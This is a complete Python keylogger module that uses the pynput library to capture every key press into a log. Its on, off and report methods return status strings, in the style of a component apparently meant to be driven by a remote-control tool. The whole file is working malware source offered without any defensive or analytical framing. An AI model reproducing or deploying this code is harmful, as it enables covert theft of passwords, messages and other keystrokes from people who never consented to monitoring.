import pynput
class keylogger:
    def __init__(self):
        self.keylogger_log = ""
        self.keylogger_previous_command = ""
        self.keylogger_listener = None

    def ProcessKeyPress(self,key):
        try:
            current_key=str(key.char)
        except AttributeError:
            if key==key.space:
                current_key=" "
            else:
                current_key=" "+str(key)+" "
        self.keylogger_log=self.keylogger_log+current_key
           
    def on(self):
        if self.keylogger_previous_command == "on":
            return "[-] Keylogger is already on"
        keylogger_listener = pynput.keyboard.Listener(on_press=self.ProcessKeyPress)
        keylogger_listener.start()
        self.keylogger_previous_command = "on"
        self.keylogger_listener=keylogger_listener
        return "[+] Keylogger is on"

    def off(self):
        if self.keylogger_previous_command == "off":
            return "[-] Keylogger is already off"
        self.keylogger_previous_command = "off"
        self.keylogger_log = "Keylogger is off"
        self.keylogger_listener.stop()
        return "[+] Keylogger is off"
    
    def report(self):
        if self.keylogger_log == "Keylogger is off":
            return "[-] Keylogger is off"
        elif self.keylogger_log == "":
            return "[-] Keylogger is empty"
        else:
            return self.keylogger_log

